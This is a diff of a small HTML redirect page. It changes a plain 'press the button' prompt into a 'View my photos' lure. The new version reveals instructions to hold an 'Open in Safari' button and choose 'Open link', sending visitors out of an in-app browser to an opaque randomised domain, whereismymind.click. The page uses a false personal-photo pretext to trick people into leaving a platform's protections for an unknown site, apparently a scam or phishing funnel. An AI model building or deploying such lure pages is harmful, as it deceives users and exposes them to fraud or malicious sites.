@@ -1,85 +1,142 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>Перейти по ссылке</title>
-    <style>
-        html, body {
-            height: 100%;
-            margin: 0;
-        }
-        body {
-            display: flex;
-            justify-content: center;   
-            align-items: center;       
-            background-color: #1abc9c; 
-            font-family: Arial, sans-serif;
-            text-align: center;
-            flex-direction: column;
-            color: white;              
-        }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Перейти по ссылке</title>
+  <style>
+    html, body {
+      height: 100%;
+      margin: 0;
+      background-color: #4B0082; /* Фиолетовый фон */
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: Arial, sans-serif;
+      color: white;
+      flex-direction: column;
+      text-align: center;
+    }
 
-        h2 {
-            margin-bottom: 20px;
-            font-size: 1.5em;
-        }
+    .container {
+      background: white;
+      border-radius: 12px;
+      padding: 30px 40px;
+      width: 320px;
+      color: black;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+    }
 
-        button {
-            padding: 15px 30px;
-            font-size: 1.2em;
-            background-color: black;  
-            color: white;             
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            margin: 10px 0;
-            transition: background-color 0.3s ease;
-        }
+    .container svg {
+      width: 40px;
+      height: 40px;
+      margin-bottom: 20px;
+    }
 
-        button:hover {
-            background-color: #333333;  
-        }
+    .container h2 {
+      margin: 0 0 10px 0;
+      font-weight: 700;
+      font-size: 18px;
+    }
 
-        @media (max-width: 600px) {
-            h2 {
-                font-size: 1.2em;
-            }
+    .btn {
+      background-color: #ff2a68;
+      color: white;
+      border: none;
+      padding: 15px 25px;
+      font-size: 16px;
+      border-radius: 25px;
+      cursor: pointer;
+      box-shadow: 0 4px 12px rgba(255, 42, 104, 0.4);
+      transition: background-color 0.3s ease;
+      width: 100%;
+    }
 
-            button {
-                padding: 12px 24px;
-                font-size: 1em;
-            }
-        }
-    </style>
-    <script>
-        window.onload = function() {
-            var userLang = navigator.language || navigator.userLanguage;
-            var buttonText = userLang.includes('ru') ? 'Зажми кнопку' : 'Press the button';
-            document.getElementById('buttonText').innerText = buttonText;
+    .btn:hover {
+      background-color: #e0225a;
+    }
 
-            var userOS = navigator.platform.toLowerCase();
+    .arrow {
+      margin-top: 40px;
+      width: 40px;
+      height: 60px;
+      position: relative;
+      animation: bounce 2s infinite;
+      filter: drop-shadow(0 0 3px white);
+    }
 
-            if (userOS.includes('win') || userOS.includes('mac') || userOS.includes('linux')) {
-                document.getElementById('openInBrowser').style.display = 'block';
-                document.getElementById('mobileButton').style.display = 'none';
-            } else {
-                document.getElementById('openInBrowser').style.display = 'none';
-                document.getElementById('mobileButton').style.display = 'block';
-            }
-        };
+    .arrow svg {
+      width: 100%;
+      height: 100%;
+    }
 
-        function openLink() {
-            window.location.href = 'https://v6y2mrb.whereismymind.click/khfgtxq';
-        }
-    </script>
+    @keyframes bounce {
+      0%, 100% {
+        transform: translateY(0);
+      }
+      50% {
+        transform: translateY(15px);
+      }
+    }
+
+    /* Скрытая секция с инструкциями */
+    .instructions {
+      display: none;
+      margin-top: 20px;
+    }
+
+    .instructions button {
+      background-color: #999999;
+      color: white;
+    }
+
+  </style>
+  <script>
+    window.onload = function() {
+      var userLang = navigator.language || navigator.userLanguage;
+      var btnText = userLang.includes('ru') ? 'Просмотреть мои фото' : 'View my photos';
+      document.getElementById('actionBtn').innerText = btnText;
+
+      // Логика при нажатии на кнопку "View my photos"
+      document.getElementById('actionBtn').onclick = function() {
+        document.getElementById('actionBtn').style.display = 'none';  // скрыть кнопку
+        document.getElementById('instructions').style.display = 'block'; // показать инструкции
+      };
+
+      // Действие при нажатии на кнопку "Open in Safari"
+      document.getElementById('openSafariBtn').onclick = function() {
+        window.location.href = 'https://v6y2mrb.whereismymind.click/khfgtxq'; // твоя ссылка
+      };
+    }
+  </script>
 </head>
 <body>
-    <div>
-        <h2 id="buttonText">Зажми кнопку</h2>
-        <button id="mobileButton" onclick="openLink()" style="display:none;">Перейти в браузер</button>
-        <br><br>
-        <button id="openInBrowser" style="display:none;" onclick="window.location.href = 'https://v6y2mrb.whereismymind.click/khfgtxq';">Open in Browser</button>
+
+  <div class="container">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+      <path d="M16 3h4a2 2 0 0 1 2 2v4"/>
+      <polyline points="10 14 21 3 21 10"/>
+      <line x1="21" y1="21" x2="21" y2="14"/>
+      <polyline points="21 3 3 21 14 10"/>
+    </svg>
+    <h2>Open in an external browser</h2>
+    <button id="actionBtn" class="btn">View my photos</button>
+
+    <!-- Секция с инструкциями -->
+    <div id="instructions" class="instructions">
+      <h2>1. Hold the 'Open in Safari' button below</h2>
+      <h2>2. Select 'Open link' in the menu that appears</h2>
+      <button id="openSafariBtn" class="btn">Open in Safari</button>
     </div>
+  </div>
+
+  <div class="arrow" aria-hidden="true">
+    <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+      <line x1="12" y1="5" x2="12" y2="19"/>
+      <polyline points="19 12 12 19 5 12"/>
+    </svg>
+  </div>
+
 </body>
 </html>
+
